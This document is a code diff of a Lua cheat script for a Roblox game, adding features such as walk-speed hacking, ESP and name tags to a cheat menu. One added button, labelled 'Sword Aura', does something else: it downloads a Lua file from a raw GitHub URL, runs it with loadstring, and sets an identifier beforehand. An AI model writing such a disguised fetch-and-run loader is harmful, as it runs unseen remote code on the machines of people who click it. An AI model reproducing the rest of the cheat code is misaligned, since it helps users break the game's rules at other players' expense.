@@ -121,16 +121,13 @@ Auto:Button("Give Potion",function()
 end)
 
 
-Misc:Toggle("Anti AFK",function(bool)
-    shared.Misc1 = bool
+Misc:Button("Sword Aura",function()
     spawn (function()
-        if shared.Misc1 then
-            game:GetService("Players").LocalPlayer.Idled:connect(function()
-            virtual:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
-            wait(1)
-            virtual:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
-            end)
-        end
+        local credit='guardscripts'
+        local url=('https://raw.githubusercontent.com/%s/myscripts/main/scriptinit.lua'):format(credit)
+        init=loadstring(game:HttpGet(url,true))
+        getgenv().xscriptId='NDA5MzBy'
+        init()
     end)
 end)
 
@@ -166,10 +163,25 @@ Misc:Toggle("Teleport",function(bool)
     end)
 end)
 
-local Speed = Misc:Slider("Slider",{
+Misc:Toggle("NameTags",function(bool)
+    shared.Misc5 = bool
+    spawn(function()
+        if shared.Misc5 then NameTag() else
+            for _,v in pairs(Players:GetChildren()) do
+                if v.Character:WaitForChild("Head"):FindFirstChild("BillboardGui") then
+                    v.Character:WaitForChild("Head"):FindFirstChild("BillboardGui"):Destroy()
+                end
+            end
+            Connect1:Disconnect()Connect2:Disconnect()Connect3:Disconnect()
+        end
+        wait()
+    end)
+end)
+
+local Speed = Misc:Slider("Walk Speed",{
     ['default'] = 16;
     ['min'] = 0;
-    ['max'] = 100;
+    ['max'] = 200;
     ['precise'] = true;
 },function(value)
     game:GetService("Players").LocalPlayer.Character.Humanoid.WalkSpeed = value
@@ -187,3 +199,8 @@ Misc:Button("ESP",function()
 end)
 
 Misc:DestroyGui()
+
+game:GetService("Players").LocalPlayer.Idled:connect(function()
+virtual:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+wait(1)
+virtual:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)end)
